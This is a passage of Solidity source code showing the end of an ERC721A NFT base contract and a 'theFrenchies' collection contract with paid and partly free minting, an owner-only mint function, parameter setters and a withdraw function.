1087         uint256 startTokenId = currentIndex;
1088         require(to != address(0), "ERC721A: mint to the zero address");
1089         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1090 
1091         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1092 
1093         // Overflows are incredibly unrealistic.
1094         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1095         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1096         unchecked {
1097             _addressData[to].balance += uint128(quantity);
1098             _addressData[to].numberMinted += uint128(quantity);
1099 
1100             _ownerships[startTokenId].addr = to;
1101             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1102 
1103             uint256 updatedIndex = startTokenId;
1104 
1105             for (uint256 i; i < quantity; i++) {
1106                 emit Transfer(address(0), to, updatedIndex);
1107                 if (safe) {
1108                     require(
1109                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1110                         "ERC721A: transfer to non ERC721Receiver implementer"
1111                     );
1112                 }
1113 
1114                 updatedIndex++;
1115             }
1116 
1117             currentIndex = updatedIndex;
1118         }
1119 
1120         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1121     }
1122 
1123     /**
1124      * @dev Transfers `tokenId` from `from` to `to`.
1125      *
1126      * Requirements:
1127      *
1128      * - `to` cannot be the zero address.
1129      * - `tokenId` token must be owned by `from`.
1130      *
1131      * Emits a {Transfer} event.
1132      */
1133     function _transfer(
1134         address from,
1135         address to,
1136         uint256 tokenId
1137     ) private {
1138         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1139 
1140         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1141             getApproved(tokenId) == _msgSender() ||
1142             isApprovedForAll(prevOwnership.addr, _msgSender()));
1143 
1144         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1145 
1146         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1147         require(to != address(0), "ERC721A: transfer to the zero address");
1148 
1149         _beforeTokenTransfers(from, to, tokenId, 1);
1150 
1151         // Clear approvals from the previous owner
1152         _approve(address(0), tokenId, prevOwnership.addr);
1153 
1154         // Underflow of the sender's balance is impossible because we check for
1155         // ownership above and the recipient's balance can't realistically overflow.
1156         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1157         unchecked {
1158             _addressData[from].balance -= 1;
1159             _addressData[to].balance += 1;
1160 
1161             _ownerships[tokenId].addr = to;
1162             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1163 
1164             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1165             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1166             uint256 nextTokenId = tokenId + 1;
1167             if (_ownerships[nextTokenId].addr == address(0)) {
1168                 if (_exists(nextTokenId)) {
1169                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1170                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1171                 }
1172             }
1173         }
1174 
1175         emit Transfer(from, to, tokenId);
1176         _afterTokenTransfers(from, to, tokenId, 1);
1177     }
1178 
1179     /**
1180      * @dev Approve `to` to operate on `tokenId`
1181      *
1182      * Emits a {Approval} event.
1183      */
1184     function _approve(
1185         address to,
1186         uint256 tokenId,
1187         address owner
1188     ) private {
1189         _tokenApprovals[tokenId] = to;
1190         emit Approval(owner, to, tokenId);
1191     }
1192 
1193     /**
1194      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1195      * The call is not executed if the target address is not a contract.
1196      *
1197      * @param from address representing the previous owner of the given token ID
1198      * @param to target address that will receive the tokens
1199      * @param tokenId uint256 ID of the token to be transferred
1200      * @param _data bytes optional data to send along with the call
1201      * @return bool whether the call correctly returned the expected magic value
1202      */
1203     function _checkOnERC721Received(
1204         address from,
1205         address to,
1206         uint256 tokenId,
1207         bytes memory _data
1208     ) private returns (bool) {
1209         if (to.isContract()) {
1210             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1211                 return retval == IERC721Receiver(to).onERC721Received.selector;
1212             } catch (bytes memory reason) {
1213                 if (reason.length == 0) {
1214                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1215                 } else {
1216                     assembly {
1217                         revert(add(32, reason), mload(reason))
1218                     }
1219                 }
1220             }
1221         } else {
1222             return true;
1223         }
1224     }
1225 
1226     /**
1227      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1228      *
1229      * startTokenId - the first token id to be transferred
1230      * quantity - the amount to be transferred
1231      *
1232      * Calling conditions:
1233      *
1234      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1235      * transferred to `to`.
1236      * - When `from` is zero, `tokenId` will be minted for `to`.
1237      */
1238     function _beforeTokenTransfers(
1239         address from,
1240         address to,
1241         uint256 startTokenId,
1242         uint256 quantity
1243     ) internal virtual {}
1244 
1245     /**
1246      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1247      * minting.
1248      *
1249      * startTokenId - the first token id to be transferred
1250      * quantity - the amount to be transferred
1251      *
1252      * Calling conditions:
1253      *
1254      * - when `from` and `to` are both non-zero.
1255      * - `from` and `to` are never both zero.
1256      */
1257     function _afterTokenTransfers(
1258         address from,
1259         address to,
1260         uint256 startTokenId,
1261         uint256 quantity
1262     ) internal virtual {}
1263 }
1264 
1265 contract theFrenchies is ERC721A, Ownable, ReentrancyGuard {
1266     string public baseURI = "ipfs://thefrenchies/";
1267     uint   public price             = 0.008 ether;
1268     uint   public maxPerTx          = 20;
1269     uint   public maxPerFree        = 2;
1270     uint   public totalFree         = 2500;
1271     uint   public maxSupply         = 5000;
1272     bool   public paused            = true;
1273 
1274     mapping(address => uint256) private _mintedFreeAmount;
1275 
1276     constructor() ERC721A("theFrenchies", "FRS"){}
1277 
1278     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1279         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1280         string memory currentBaseURI = _baseURI();
1281         return bytes(currentBaseURI).length > 0
1282             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1283             : "";
1284     }
1285 
1286     function mint(uint256 count) external payable {
1287         uint256 cost = price;
1288         bool isFree = ((totalSupply() + count < totalFree + 1) &&
1289             (_mintedFreeAmount[msg.sender] < maxPerFree));
1290 
1291         if (isFree) {
1292             require(!paused, "The contract is paused!");
1293             require(msg.value >= (count * cost) - cost, "INVALID_ETH");
1294             require(totalSupply() + count <= maxSupply, "No more Frenchies.");
1295             require(count <= maxPerTx, "Max per TX reached.");
1296             _mintedFreeAmount[msg.sender] += count;
1297         }
1298         else{
1299         require(!paused, "The contract is paused!");
1300         require(msg.value >= count * cost, "Send the exact amount: 0.008*(count)");
1301         require(totalSupply() + count <= maxSupply, "No more Frenchies.");
1302         require(count <= maxPerTx, "Max per TX reached.");
1303         }
1304 
1305         _safeMint(msg.sender, count);
1306     }
1307 
1308     function EmmanuelMacron(address mintAddress, uint256 count) public onlyOwner {
1309         _safeMint(mintAddress, count);
1310     }
1311 
1312     function setPaused(bool _state) public onlyOwner {
1313     paused = _state;
1314     }
1315 
1316     function _baseURI() internal view virtual override returns (string memory) {
1317         return baseURI;
1318     }
1319 
1320     function setBaseUri(string memory baseuri_) public onlyOwner {
1321         baseURI = baseuri_;
1322     }
1323 
1324     function setPrice(uint256 price_) external onlyOwner {
1325         price = price_;
1326     }
1327 
1328     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1329         totalFree = MaxTotalFree_;
1330     }
1331 
1332     function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1333         maxPerFree = MaxPerFree_;
1334     }
1335 
1336     function setMaxPerTx(uint256 MaxPerTransac_) external onlyOwner {
1337         maxPerTx = MaxPerTransac_;
1338     }
1339 
1340     function setMaxFrenchies(uint256 MaxFrenchies_) external onlyOwner {
1341         maxSupply = MaxFrenchies_;
1342     }
1343 
1344     function withdraw() external onlyOwner nonReentrant {
1345         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1346         require(success, "Transfer failed.");
1347     }
1348 }